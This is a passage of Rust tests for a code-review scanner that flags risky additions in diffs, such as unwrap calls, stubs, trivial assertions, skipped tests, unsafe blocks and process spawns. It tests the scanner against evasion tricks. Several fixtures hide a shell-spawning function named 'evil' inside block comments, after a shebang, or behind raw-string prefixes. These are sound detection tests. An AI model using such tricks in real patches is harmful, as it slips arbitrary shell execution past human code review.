        }
        // hunks with nothing in them give nothing, whatever their size and their language
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        for file in [
            hunk_of("a.py", &[&filler]),
            hunk_of("src/removed.rs", &["-    y.unwrap();"]),
            hunk_of("src/plain.rs", &[&filler]),
        ] {
            assert_eq!(found(&file), [], "{}", file.path);
        }
        // a construct can open on an unchanged line and reach an added one
        assert_eq!(
            found(&hunk_of(
                "src/context.rs",
                &["     assert!(", "+        true", "     );"]
            )),
            [(S::TrivialAssert, Basis::Hunk, 3)]
        );
    }

    /// Second independent review, IR2-H-5, and the third, IR3-H-1. For some text the parser's
    /// time grew with the square of the length: `// todo`, a newline and `#!#!#!…` took 15 s
    /// at 64 KiB, and, inside the budget of squares that was sized on that text, the same
    /// with `&)` took 15 s at 8 KB and 118 s at 22 KB (release build). No count multiplied by
    /// a constant measured on one text bounds a parser on another. The reader of tokens has
    /// no such text: it does a bounded amount of work for each token. Here each unit the
    /// reviews found slow, and each word the reader looks from, is ranked at the two sizes of
    /// the third review and at two million bytes: on one line and a unit a line, under a word
    /// the parser read, as a new file and as a change.
    #[test]
    fn two_megabytes_of_any_text_cost_what_they_are_long() {
        for unit in [
            "&)",
            "#!",
            "a?b:",
            ".unwrap",
            "assert!(",
            "#[cfg_attr(",
            "::<",
            // more of the third review's slow pairs, and the reader's own long looks
            ",*",
            "->*",
            "a,",
            ".unwrap::<",
            "Result::<",
            "X::<a>::unwrap",
            "#[cfg_attr(a, cfg_attr(",
            "#[test] fn a() {",
            "#[",
            "}",
        ] {
            let slowest = within_deadline(move || {
                let mut slowest = (std::time::Duration::ZERO, 0, "");
                for bytes in [8_000, 22_000, 2_000_000] {
                    let count = bytes / unit.len();
                    let one_line = format!("// todo\n{}", unit.repeat(count));
                    let a_unit_a_line = format!(
                        "// todo\n{}",
                        format!("{unit}\n").repeat((count / 2).min(150_000))
                    );
                    for text in [one_line, a_unit_a_line] {
                        let lines: Vec<&str> = text.lines().collect();
                        let file = new_file("src/hostile.rs", &lines);
                        let changed: Vec<String> = lines
                            .iter()
                            .enumerate()
                            .map(|(n, line)| format!("{}{line}", ['+', '-', ' '][n % 3]))
                            .collect();
                        let changed: Vec<&str> = changed.iter().map(String::as_str).collect();
                        let change = hunk_of("src/hostile.rs", &changed);
                        let start = ScanClock::start();
                        let ranked = crate::rank(&[file, change]);
                        let spent = start.elapsed();
                        assert_eq!(ranked.len(), 2);
                        if spent > slowest.0 {
                            slowest = (spent, text.len(), start.kind);
                        }
                    }
                }
                slowest
            });
            // A debug build ranks the slowest of these pairs in about a second of CPU time (a
            // release build in a few hundredths). The parser took 118 s for 22 KB of the
            // first unit, in a release build.
            assert!(
                slowest.0 < COST_BOUND,
                "{} bytes of {unit:?} took {:?} of {}",
                slowest.1,
                slowest.0,
                slowest.2
            );
        }
    }

    /// The most CPU time ranking two megabytes of one unit may take in a test build.
    const COST_BOUND: std::time::Duration = std::time::Duration::from_secs(20);

    /// A hunk with very many items is read in one pass. The parser's answer used to be merged
    /// by searching the items for each construct and then sorting them with a key that searched
    /// the hunk: a hunk of 300,000 such lines did not finish in 30 seconds. The token reader's
    /// items come in hunk order and are merged with one index that only moves forward.
    #[test]
    fn a_hunk_with_very_many_items_is_read_in_one_pass() {
        const LINES: usize = 150_000;
        let added = vec!["+    y.unwrap();"; LINES];
        let matches = |file: &ReviewFile| {
            file_found(file, &joined_texts(file), None)
                .remove(0)
                .iter()
                .map(|hit| (hit.side, hit.signal, hit.number, hit.basis))
                .collect::<Vec<_>>()
        };
        // every line is an item (before: and one more, the mark of a hunk the parser did not
        // read)
        let items = within_deadline(move || matches(&hunk_of("src/a.rs", &added)));
        assert_eq!(items.len(), LINES);
        assert_eq!(
            &items[..2],
            [
                (Side::New, S::PanicPathAdded, 2, Basis::Lexical),
                (Side::New, S::PanicPathAdded, 3, Basis::Lexical),
            ]
        );
        assert!(items.windows(2).all(|pair| pair[0].2 < pair[1].2));
        // as many items on the old side, and one on the new
        let mut removed = vec!["-#[test]"; LINES];
        removed.push("+    y.unwrap();");
        let items = within_deadline(move || matches(&hunk_of("tests/a.rs", &removed)));
        assert_eq!(items.len(), LINES + 1);
        assert_eq!(items[0], (Side::Old, S::TestRemoved, 2, Basis::Lexical));
        assert_eq!(
            items[LINES],
            (Side::New, S::PanicPathAdded, 2, Basis::Lexical)
        );
        // a construct on every line and each over two lines: `x.` and `unwrap();`
        let split: Vec<&str> = (0..LINES)
            .map(|n| {
                if n % 2 == 0 {
                    "+    x."
                } else {
                    "+    unwrap();"
                }
            })
            .collect();
        let items = within_deadline(move || matches(&hunk_of("src/a.rs", &split)));
        assert_eq!(items.len(), LINES / 2);
        assert!(items.iter().all(|item| item.3 == Basis::Hunk));
    }

    /// Review V3 round 3, VD3R3-M-1. The parser compared a construct that reached an added
    /// line with the old side, and another trivial assertion on the same line, or an old side
    /// too large to parse, hid an assertion that the change made trivial. Nothing is compared
    /// with the old side now: a construct is judged by its own tokens, and the old side of a
    /// hunk can hold anything.
    #[test]
    fn a_construct_is_judged_by_its_own_tokens_whatever_the_old_side_holds() {
        let same_row = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true); assert!(",
                "-        computes()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(same_row, [(S::TrivialAssert, Basis::Hunk, 4)]);
        // the first of the two already was trivial and only its message changes: still nothing
        let first = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(true,",
                "-        \"old\"",
                "+        \"new\"",
                "     ); assert!(computes());",
            ],
        ));
        assert_eq!(first, []);
        // an old side of 68 KB (before, under a review's plan: `syntax_unchecked`)
        let long = format!("-        {}", "1 + ".repeat(17_000) + "1 > 0");
        let file = hunk_of(
            "tests/m.rs",
            &[
                " fn check() {",
                "     assert!(",
                long.as_str(),
                "+        true",
                "     );",
            ],
        );
        assert_eq!(found(&file), [(S::TrivialAssert, Basis::Hunk, 4)]);
    }

    /// Review V3 round 3, VD3R3-H-2. Whoever orders the hunks of a review must not be able to
    /// hide a later one. While the parser had a budget, harmless hunks could spend it, and a
    /// later construct that only the parser found gave no evidence, then a mark
    /// (`syntax_unchecked`). With no budget there is nothing to spend: the construct is found
    /// after any hunks.
    #[test]
    fn no_order_of_hunks_hides_a_construct() {
        // the assertion is over three lines
        let hidden: &[&str] = &["+    assert!(", "+        true", "+    );"];
        let filler = format!("+    let x = {};", "1 + ".repeat(15_000) + "1");
        // Vesper's reproduction: 40 harmless hunks of about 60 KB, then the construct
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&filler]))
            .collect();
        files.push(hunk_of("tests/last.rs", hidden));
        let evidence_of = |files: &[ReviewFile], path: &str| -> Vec<(EvidenceSignal, Basis, u32)> {
            crate::rank(files)
                .iter()
                .find(|file| file.path == path)
                .expect("the file is ranked")
                .evidence
                .iter()
                .map(|e| (e.signal, e.basis, e.line))
                .collect()
        };
        assert_eq!(
            evidence_of(&files, "tests/last.rs"),
            [(S::TrivialAssert, Basis::Hunk, 2)]
        );
        // the same with filler that holds a word the parser read (hunks of about 12 KB, of
        // which its square budget took three): before, `syntax_unchecked` for the last file
        let filler = format!("+    let x = {};", "1 + ".repeat(3_000) + "1");
        let costly = format!("{filler} // unwrap");
        let mut files: Vec<ReviewFile> = (0..40)
            .map(|n| hunk_of(&format!("src/f{n}.rs"), &[&costly]))
            .collect();
        files.push(hunk_of(
            "tests/last.rs",
            &[&filler, "+    assert!(", "+        true", "+    );"],
        ));
        assert_eq!(
            evidence_of(&files, "tests/last.rs"),
            [(S::TrivialAssert, Basis::Hunk, 3)]
        );
        assert_eq!(evidence_of(&files, "src/f0.rs"), []);
        assert_eq!(found(&hunk_of("a.py", &["+x = 1  # unwrap"])), []);
        // a stub after a line of 68 KB (before: with `syntax_unchecked` beside it)
        let later = hunk_of(
            "src/big.rs",
            &[
                "+    let a = 1;",
                &format!("+    let b = {};", "1 + ".repeat(17_000) + "1"),
                "+    todo ! ( );",
            ],
        );
        assert_eq!(found(&later), [(S::StubAdded, Basis::Lexical, 4)]);
    }

    /// Review V3 round 3, VD3R3-H-2: every spacing of a construct is the same tokens. (These
    /// spellings were taught to the line rules one by one, so that a hunk the parser did not
    /// read lost as little as could be; each line here is 70 KB long, which was past the
    /// parser's budget.)
    #[test]
    fn a_construct_is_read_whatever_its_spacing() {
        let pad = "a".repeat(70_000);
        for (line, signal) in [
            ("value.unwrap ();", S::PanicPathAdded),
            ("value . expect (\"set\");", S::PanicPathAdded),
            ("assert!( true );", S::TrivialAssert),
            ("assert ! (true , \"always\");", S::TrivialAssert),
            ("debug_assert!( true );", S::TrivialAssert),
            ("assert_eq!( true , true );", S::TrivialAssert),
            ("todo ! ();", S::StubAdded),
            ("unimplemented !( \"later\" )", S::StubAdded),
            ("# [ ignore ]", S::TestSkipped),
            ("#[ignore = \"slow\"]", S::TestSkipped),
            ("#[ cfg_attr( miri , ignore ) ]", S::TestSkipped),
            // the inputs the line rules' own functions were held to
            ("assert\t! ( true )", S::TrivialAssert),
            ("debug_assert_eq ! (true,true , \"m\")", S::TrivialAssert),
            ("assert!(true, true_enough)", S::TrivialAssert),
            ("# [ ignore = \"slow\" ]", S::TestSkipped),
            ("#[cfg_attr(miri, ignore = \"slow\")]", S::TestSkipped),
            // Tokens that are no Rust outside a macro's body, and inside one are what they
            // look like, since a macro can drop what stands before them (`x#[ignore]` up to
            // edition 2018: compiled and run, the test does not run). The line rules wanted
            // no name and no dot before the word.
            ("x.assert!(true);", S::TrivialAssert),
            ("x#[ignore]", S::TestSkipped),
        ] {
            for text in [format!("+    {line}"), format!("+    {line} // {pad}")] {
                assert_eq!(
                    found(&hunk_of("tests/a.rs", &[text.as_str()])),
                    [(signal, Basis::Lexical, 2)],
                    "{line}"
                );
            }
        }
        // the word itself is not split, a cut argument list does not match, and neither does
        // another macro that only begins or ends the same way
        for line in [
            "my_assert!( true );",
            "assert!( true_enough() );",
            "assert!( true == x );",
            "retodo ! ();",
            "x.unwrap_or ();",
            "unwrap ();",
            "#[cfg_attr(miri, allow(ignore_me))]",
            "ass ert!(true)",
            "assert!(tru",
            "assert_ne!(true, true)",
            "assert_eq!(true)",
            "#[ignored]",
            "#[cfg_attr(miri, ignored)]",
            "[ignore]",
        ] {
            for text in [format!("+    {line}"), format!("+    {line} // {pad}")] {
                assert_eq!(
                    found(&hunk_of("tests/a.rs", &[text.as_str()])),
                    [],
                    "{line}"
                );
            }
        }
        // An assertion cut after its `true` is no assertion, in the middle of a side and at
        // the end of one: what stands after the side is not shown, and it can be `== x`
        // (rounds 15 and 16 read the end of a side here; ninth independent review, IR9-M-2).
        // With the comma after it the condition is over.
        assert_eq!(
            found(&hunk_of(
                "tests/a.rs",
                &["+    assert!(true", "+    == x);"]
            )),
            []
        );
        assert_eq!(found(&hunk_of("tests/a.rs", &["+    assert!(true"])), []);
        assert_eq!(
            found(&hunk_of("tests/a.rs", &["+    assert!(true,"])),
            [(S::TrivialAssert, Basis::Lexical, 2)]
        );
        // the one rule left that passes over spaces on a line: `# [allow(`
        assert!(spaced("# [ allow (x)]", &["#"], &["[allow("]));
        assert!(!spaced("", &["#"], &["[allow("]) && !spaced("#[allow(", &[], &["[allow("]));
        assert!(!spaced("x#[allow(x)]", &["#"], &["[allow("]));
        assert_eq!(follows(b"", b""), Some(0));
        assert_eq!(
            (follows(b"  ", b"!"), follows(b" ! (", b"!(")),
            (None, Some(4))
        );
    }

    /// Fifth independent review, IR5-H-1. After a string that runs over a line end, a comment
    /// with two quotes in it between the tokens of a construct hid the construct, and so did
    /// a closing bracket inside a later string. Each line after the open string was read two
    /// ways and the bytes of both readings were united; the two were out of step to the end
    /// of the hunk, and the union showed `""` between `unwrap` and `(`. rustc 1.99.1 compiles
    /// every text here, and the programs panic and skip as written. A view is one whole
    /// reading now; what readings find is united, their bytes are not.
    #[test]
    fn after_a_string_over_lines_a_comment_between_tokens_hides_nothing() {
        // the review's `union-hide.rs`: a file the patch creates
        let hide = [
            "pub const HELP: &str = \"usage: tool",
            "  --all   run everything\";",
            "",
            "pub fn first(v: &[u8]) -> u8 {",
            "    *v.first().unwrap/*\"\"*/()",
            "}",
            "",
            "pub fn later() -> u32 {",
            "    todo/*\"\"*/!()",
            "}",
            "",
            "#[cfg(test)]",
            "mod tests {",
            "    #[test]",
            "    #[/*\"\"*/ignore]",
            "    fn skipped() {",
            "        assert_eq!(1 + 1, 3);",
            "    }",
            "",
            "    #[test]",
            "    fn checks_nothing() {",
            "        assert!(/*\"\"*/true);",
            "    }",
            "}",
        ];
        assert_eq!(
            found(&new_file("src/lib.rs", &hide)),
            [
                (S::PanicPathAdded, Basis::Lexical, 5),
                (S::StubAdded, Basis::Lexical, 9),
                (S::TestSkipped, Basis::Lexical, 15),
                (S::TrivialAssert, Basis::Lexical, 22),
            ]
        );
        // `skip-hide.rs`: no comment, a `)` inside a string of the condition
        assert_eq!(
            found(&new_file(
                "src/lib.rs",
                &[
                    "pub const HELP: &str = \"usage: tool",
                    "  --all   run everything\";",
                    "",
                    "#[cfg(test)]",
                    "mod tests {",
                    "    #[test]",
                    "    #[cfg_attr(not(feature = \"never)\"), ignore)]",
                    "    fn the_check_that_matters() {",
                    "        assert_eq!(1 + 1, 3);",
                    "    }",
                    "}",
                ]
            )),
            [(S::TestSkipped, Basis::Lexical, 7)]
        );
        // `mod-union.patch`: a hunk of an existing file, the string in its unchanged lines
        let file = parse(
            "--- a/src/cli.rs\n+++ b/src/cli.rs\n@@ -3,8 +3,8 @@ use std::fmt;\n \n pub const HELP: &str = \"usage: tool\n   --all   run everything\";\n \n pub fn first(v: &[u8]) -> u8 {\n-    v.first().copied().unwrap_or(0)\n+    *v.first().unwrap/*\"\"*/()\n }\n \n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&file), [(S::PanicPathAdded, Basis::Lexical, 8)]);
        // The same cause gave false items, in released versions too (`union-fp.rs`): after
        // the string over lines, the text of a comment and of a later string was read as
        // code. Four items then. The readings of the compiler's lexer give none; the two of
        // them that release 0.8.3 had signals for are still reported, by the reading of that
        // release, which is kept so that nothing it reported is lost (`released_hits`): this is
        // that reading's cost.
        assert_eq!(
            found(&new_file(
                "src/lib.rs",
                &[
                    "pub const HELP: &str = \"usage: tool",
                    "  --all   run everything\";",
                    "",
                    "pub fn notes() -> &'static str {",
                    "    // the old code said \"x.unwrap()\" here",
                    "    \"never call std::process::Command::new(sh) or todo!() or unsafe { } in a handler\"",
                    "}",
                ]
            )),
            [
                (S::UnsafeAdded, Basis::Lexical, 6),
                (S::ProcessSpawn, Basis::Lexical, 6),
            ]
        );
    }

    /// Round 12 of Vesper's review, VD3R12-M-1. A hunk of an existing file does not say what
    /// the lines above it left open. Read from code only, a line added inside an existing
    /// block comment, `// */ pub fn evil() { … } /*`, was a line comment, and the spawn the
    /// compiler compiles left nothing. A side that does not start at line 1 is now also read
    /// as beginning inside one block comment, and what either reading finds is found.
    #[test]
    fn a_hunk_that_may_begin_inside_a_block_comment_is_read_that_way_too() {
        let spawn = [(S::ProcessSpawn, Basis::Lexical)];
        let signals = |text: &str| -> Vec<(S, Basis)> {
            found(&parse(text).unwrap().remove(0))
                .iter()
                .map(|(signal, basis, _)| (*signal, *basis))
                .collect()
        };
        // `inside-existing-comment.patch`
        assert_eq!(
            signals(
                "--- a/src/net.rs\n+++ b/src/net.rs\n@@ -3,5 +3,6 @@\n    The sync step is described here at length,\n    over several lines of an existing block comment.\n+   // */ pub fn evil(u: &str) { std::process::Command::new(\"sh\").arg(\"-c\").arg(u).status().ok(); } /*\n    More prose of the same comment follows,\n    and it ends further down.\n    Still prose.\n"
            ),
            spawn
        );
        // `two-hunk-comment.patch`: the opener is added by an earlier hunk of the same file
        assert_eq!(
            signals(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -1,3 +1,4 @@\n pub fn a() {}\n+/*\n pub fn b() {}\n pub fn c() {}\n@@ -9,3 +10,4 @@\n pub fn i() {}\n pub fn j() {}\n+// */ pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }\n pub fn k() {}\n"
            ),
            spawn
        );
        // The same line at the top of a file is a line comment and nothing else: a side that
        // starts at line 1 cannot begin inside a comment, and is not read as if it did.
        assert_eq!(
            signals(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -1,2 +1,3 @@\n pub fn i() {}\n+// */ pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }\n pub fn k() {}\n"
            ),
            []
        );
        assert_eq!(
            found(&new_file(
                "src/lib.rs",
                &["// */ pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }"]
            )),
            []
        );
        // The cost, accepted with the finding: in that second reading, a `*/` inside a string
        // near the start of a fragment ends the supposed comment, and the text after it is
        // read as code. This call stands in a string, and is reported. (`/**/` in a path is
        // an opener and a closer to that reading, and ends nothing.)
        let in_string = |pattern: &str| {
            signals(&format!(
                "--- a/src/glob.rs\n+++ b/src/glob.rs\n@@ -7,1 +7,2 @@\n x\n+    let pattern = \"{pattern}\";\n"
            ))
        };
        assert_eq!(
            in_string("**/x.unwrap()"),
            [(S::PanicPathAdded, Basis::Lexical)]
        );
        assert_eq!(in_string("src/**/x.unwrap()"), []);
        // The old side is read the same way: a test removed from inside such a comment.
        let file = parse(
            "--- a/src/t.rs\n+++ b/src/t.rs\n@@ -5,3 +5,2 @@\n  prose\n-  // */ #[test] fn gone() {} /*\n  prose\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&file), [(S::TestRemoved, Basis::Lexical, 6)]);
    }

    /// The starts of a Rust text. From code, for every side. Further, for a side that is not
    /// the top of its file and holds a changed line: from inside a block comment; from inside
    /// a string, when the reading from code carries anything over a line end; from inside a
    /// raw string, when it also shows a quote with `#` after it; and from the top of a file,
    /// when its first line is a shebang. Each reading covers the sides it reads and no other.
    #[test]
    fn a_rust_text_is_read_from_every_start_it_can_have() {
        use RustStart::{Comment, FileStart, RawStr, Str};
        let starts = |text: &str| -> Vec<(Option<RustStart>, Option<RustStart>)> {
            let file = parse(text).unwrap().remove(0);
            let lines: Vec<&PatchLine> = file.patch_twin.hunks[0].lines.iter().collect();
            let top = placed_at_top(file.status, &file.patch_twin.hunks[0], true);
            let old = RustText::of(&lines, PatchLineKind::Added, top);
            let new = RustText::of(&lines, PatchLineKind::Removed, top);
            let code = Some(RustStart::Code);
            let (_, old_carries, new_carries) = rust_reading(lines.len(), &old, code, &new, code);
            further_starts(&old, old_carries)
                .into_iter()
                .zip(further_starts(&new, new_carries))
                .filter(|(old, new)| old.is_some() || new.is_some())
                .collect()
        };
        // a file the patch creates; a hunk Git must put at line 1: read from code only
        assert_eq!(
            starts("--- /dev/null\n+++ b/src/a.rs\n@@ -0,0 +1,1 @@\n+fn a() {}\n"),
            []
        );
        assert_eq!(
            starts("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,1 +1,2 @@\n+text\"; fn b() {}\n x\n"),
            []
        );
        // below the top: the changed side from inside a comment, and no more while nothing
        // is carried over a line end
        assert_eq!(
            starts("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,2 +5,2 @@\n-fn a() {}\n+fn b() {}\n x\n"),
            [(Some(Comment), Some(Comment))]
        );
        // a string open over a line end: from inside a string too, on the side that has it
        assert_eq!(
            starts("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,2 +5,1 @@\n-fn a() {}\n x \"\n"),
            [(Some(Comment), None), (Some(Str), None)]
        );
        // a block comment open over a line end does the same (the review of the port, LF-H-1)
        assert_eq!(
            starts("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,2 +5,3 @@\n a/*/*/b\n+c\n d\n"),
            [(None, Some(Comment)), (None, Some(Str))]
        );
        // and with a quote that `#` follow, from inside a raw string that so many `#` opened
        assert_eq!(
            starts("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,2 +5,3 @@\n text\n+\"##; f(\n d\n"),
            [
                (None, Some(Comment)),
                (None, Some(Str)),
                (None, Some(RawStr(2)))
            ]
        );
        // a first line that would be a shebang at the top of a file
        assert_eq!(
            starts(
                "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,2 +5,3 @@\n #!/usr/bin/env run\n+c\n d\n"
            ),
            [(None, Some(FileStart)), (None, Some(Comment))]
        );
        // A further reading holds a view only for the sides it covers, and there the view of
        // a side read from its start.
        let file = parse("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,1 +5,2 @@\n+b */ c \" d\n x\n")
            .unwrap()
            .remove(0);
        let lines: Vec<&PatchLine> = file.patch_twin.hunks[0].lines.iter().collect();
        let old = RustText::of(&lines, PatchLineKind::Added, false);
        let new = RustText::of(&lines, PatchLineKind::Removed, false);
        let views = |old_start, new_start| {
            let (views, _, _) = rust_reading(lines.len(), &old, old_start, &new, new_start);
            (views.old, views.new, views.lines)
        };
        assert_eq!(
            views(Some(RustStart::Code), Some(RustStart::Code)),
            (
                true,
                true,
                vec![
                    (None, Some("b */ c \"  ".to_owned())),
                    (Some("x".to_owned()), Some(" ".to_owned()))
                ]
            )
        );
        assert_eq!(
            views(None, Some(Comment)),
            (
                false,
                true,
                vec![
                    (None, Some("     c \"  ".to_owned())),
                    (None, Some(" ".to_owned()))
                ]
            )
        );
        assert_eq!(
            views(None, Some(Str)),
            (
                false,
                true,
                vec![
                    (None, Some("       \" d".to_owned())),
                    (None, Some("x".to_owned()))
                ]
            )
        );
        // Another language has one reading, of both sides, whatever the text.
        let plain = plain_views(&lines, Some(Language::Go));
        assert!(plain.old && plain.new);
    }

    /// A side of a hunk that begins inside a string is read as beginning there when its quotes
    /// say so: read from code it ends inside a string. The fifth independent review's honest
    /// case (`honest-string.patch`): three unchanged lines of a multi-line SQL string, and a
    /// changed line that closes it and turns `.ok()` into `.unwrap()`. Read from code only,
    /// the closing quote opens a string and the call is its text. Rounds 11 and 12 missed the
    /// call on that line; and without this reading, whole views would also have lost the code
    /// on every line after such a string, which round 12 found (measured on 177,957 fragments
    /// of real crate files: 470 real items).
    #[test]
    fn a_side_that_begins_inside_a_string_is_read_that_way_when_its_quotes_say_so() {
        let honest = parse(
            "--- a/src/db.rs\n+++ b/src/db.rs\n@@ -12,7 +12,7 @@ pub fn insert(conn: &Connection, name: &str, age: u32) {\n         INSERT INTO people\n             (name, age, created)\n         VALUES\n-            (?1, ?2, now())\", params![name, age]).ok();\n+            (?1, ?2, now())\", params![name, age]).unwrap();\n }\n \n pub fn count(conn: &Connection) -> u64 {\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&honest), [(S::PanicPathAdded, Basis::Lexical, 15)]);
        // The code on the lines after the string is found too.
        let after = parse(
            "--- a/src/t.rs\n+++ b/src/t.rs\n@@ -40,3 +40,5 @@\n   the last line of a long string\";\n+    let n = load().unwrap();\n+    unsafe { run(n) }\n }\n \n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&after),
            [
                (S::PanicPathAdded, Basis::Lexical, 41),
                (S::UnsafeAdded, Basis::Lexical, 42),
            ]
        );
        // The end of the side does not have to say so. Here the string that began above ends
        // on line 1 of the hunk and another opens and stays open on its last line: read from
        // code the side ends in code, and the call between the two is the text of a string.
        // But that reading holds a string over a line end, and that is enough. (Until
        // 2026-11-14 the reading from inside a string was made only for a side that ended in
        // one, and this test held the miss as the answer: sixth independent review, IR6-H-2.)
        let even = parse(
            "--- a/src/t.rs\n+++ b/src/t.rs\n@@ -40,3 +40,4 @@\n   the last line of a long string\";\n+    let n = load().unwrap();\n     let s = \"another string that the hunk does not close\n     and goes on\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&even), [(S::PanicPathAdded, Basis::Lexical, 41)]);
        // The cost: a side that begins in code and ends inside a string it opens is read
        // from inside a string too, and there the text of its strings is code.
        let cost = parse(
            "--- a/src/t.rs\n+++ b/src/t.rs\n@@ -40,2 +40,4 @@\n fn f() {\n+    log(\"never call x.unwrap() here\");\n+    let s = \"a string that the hunk does not close\n     and goes on\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&cost), [(S::PanicPathAdded, Basis::Lexical, 41)]);
    }

    /// What two readings find is one list in hunk order: an item of both once, with the higher
    /// basis. The hint `test_likely` is the reading from code's when that reading finds the
    /// item, and otherwise the hint only when both give it.
    #[test]
    fn findings_of_two_readings_are_united() {
        let hit = |at: usize, signal: S, basis: Basis, likely: bool, from_code: bool| Hit {
            at,
            side: Side::New,
            signal,
            number: 10 + u32::try_from(at).unwrap(),
            basis,
            likely,
            from_code,
            released: false,
        };
        let key = |hits: &[Hit]| -> Vec<(usize, S, Basis, bool)> {
            hits.iter()
                .map(|h| (h.at, h.signal, h.basis, h.likely))
                .collect()
        };
        let code = [
            hit(1, S::PanicPathAdded, Basis::Lexical, true, true),
            hit(2, S::UnsafeAdded, Basis::Lexical, false, true),
            hit(2, S::PanicPathAdded, Basis::Lexical, false, true),
            hit(5, S::StubAdded, Basis::Hunk, false, true),
        ];
        let comment = [
            hit(0, S::StubAdded, Basis::Lexical, false, false),
            hit(1, S::PanicPathAdded, Basis::Hunk, false, false),
            hit(2, S::PanicPathAdded, Basis::Lexical, true, false),
            hit(5, S::StubAdded, Basis::Lexical, false, false),
            hit(7, S::PanicPathAdded, Basis::Lexical, true, false),
            hit(8, S::PanicPathAdded, Basis::Lexical, true, false),
        ];
        let string = [
            hit(7, S::PanicPathAdded, Basis::Lexical, true, false),
            hit(8, S::PanicPathAdded, Basis::Lexical, false, false),
        ];
        let expected = vec![
            (0, S::StubAdded, Basis::Lexical, false),
            // the hint of the reading from code, whatever the other says
            (1, S::PanicPathAdded, Basis::Hunk, true),
            (2, S::UnsafeAdded, Basis::Lexical, false),
            (2, S::PanicPathAdded, Basis::Lexical, false),
            (5, S::StubAdded, Basis::Hunk, false),
            (7, S::PanicPathAdded, Basis::Lexical, true),
            (8, S::PanicPathAdded, Basis::Lexical, true),
        ];
        assert_eq!(key(&unite(&code, &comment)), expected);
        assert_eq!(key(&unite(&comment, &code)), expected);
        assert_eq!(key(&unite(&code, &[])), key(&code));
        assert_eq!(key(&unite(&[], &comment)), key(&comment));
        // Found only by readings that are not the one from code: the hint if all give it.
        let all = unite(&unite(&code, &comment), &string);
        assert_eq!(
            key(&all)[5..],
            [
                (7, S::PanicPathAdded, Basis::Lexical, true),
                (8, S::PanicPathAdded, Basis::Lexical, false),
            ]
        );
        assert_eq!(key(&unite(&unite(&code, &string), &comment)), key(&all));
        // In a hunk: the panic path of a test function keeps the hint the reading from code
        // gives it, also when the reading from inside a comment finds the call after a `*/`
        // and does not see the attribute above it. (On this repository's history 49 hints
        // were lost that way before the rule was this one.) A call that only that reading
        // finds has the hint that reading gives.
        let hints = |line: &str| -> Vec<(u32, bool)> {
            let text =
                format!("--- a/src/h.rs\n+++ b/src/h.rs\n@@ -7,1 +7,3 @@\n x\n+#[test]\n+{line}\n");
            file_evidence(&parse(&text).unwrap().remove(0))
                .iter()
                .filter(|e| e.signal == S::PanicPathAdded)
                .map(|e| (e.line, e.test_likely))
                .collect()
        };
        assert_eq!(hints("fn t() { a().unwrap(); }"), [(9, true)]);
        assert_eq!(hints("fn t() { 2 */ a().unwrap(); }"), [(9, true)]);
        assert_eq!(hints("// */ #[test] fn t() { a().unwrap(); }"), [(9, true)]);
        assert_eq!(hints("// */ fn t() { a().unwrap(); }"), [(9, false)]);
    }

    /// Round 12 of Vesper's review, VD3R12-M-2. The first line of a file can be a shebang,
    /// which the compiler passes over; read as Rust, `#!/usr/bin/env -S cargo run /*` opened a
    /// comment over the file and the spawn on line 2 left nothing (rustc 1.99.1 compiles the
    /// file). The compiler's rule is applied to a side that starts at line 1.
    #[test]
    fn a_shebang_line_opens_nothing() {
        let body = [
            "#!/usr/bin/env -S cargo run /*",
            "fn main() { std::process::Command::new(\"sh\").status().ok(); }",
            "// */",
        ];
        assert_eq!(
            found(&new_file("src/main.rs", &body)),
            [(S::ProcessSpawn, Basis::Lexical, 2)]
        );
        // a hunk of an existing file that starts at line 1
        let file = parse(
            "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -1,2 +1,3 @@\n #!/usr/bin/env -S cargo run /*\n+fn main() { std::process::Command::new(\"sh\").status().ok(); }\n // */\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&file), [(S::ProcessSpawn, Basis::Lexical, 2)]);
        // `#![…]` is an inner attribute and Rust: the comment it opens is a comment.
        assert_eq!(
            found(&new_file(
                "src/main.rs",
                &[
                    "#![allow(dead_code)] /*",
                    "fn main() { std::process::Command::new(\"sh\").status().ok(); }",
                    "*/",
                ]
            )),
            [(S::CheckSuppressed, Basis::Lexical, 1)]
        );
    }

    /// Fifth independent review, IR5-M-1. `k#r"\"` holds a raw string in every edition in
    /// which rustc 1.99.1 accepts it (2015 and 2018; 2021 and 2024 refuse the prefix). Round
    /// 12 read `k#r` as one name, the quote after it as an ordinary string, and one such line
    /// hid the rest of the hunk. The review's `kraw-rest.rs`: every item is found.
    #[test]
    fn a_k_and_a_hash_before_a_raw_string_hide_nothing() {
        let body = [
            "macro_rules! m { ($($t:tt)*) => {}; }",
            "m!(k#r\"\\\"); m!(\" /* \");",
            "pub fn run() -> bool {",
            "    let s = std::process::Command::new(\"sh\").arg(\"-c\").arg(\"id\").status();",
            "    let p = unsafe { *std::ptr::null::<u8>() };",
            "    s.is_ok() && p == 0",
            "}",
            "#[test]",
            "#[ignore]",
            "fn never_runs() { assert!(true); }",
            "fn main() { println!(\"{}\", std::process::Command::new(\"true\").status().unwrap().success()); }",
        ];
        assert_eq!(
            found(&new_file("src/main.rs", &body)),
            [
